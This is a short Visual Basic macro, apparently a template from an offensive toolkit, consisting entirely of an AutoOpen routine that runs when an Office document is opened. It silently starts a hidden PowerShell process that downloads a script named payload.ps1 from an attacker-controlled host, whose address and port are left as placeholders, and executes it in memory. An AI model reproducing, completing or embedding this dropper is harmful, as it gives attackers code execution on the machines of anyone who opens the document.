Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://{{ LHOST }}:{{ LPORT }}/payload.ps1'))""", 0
End Sub
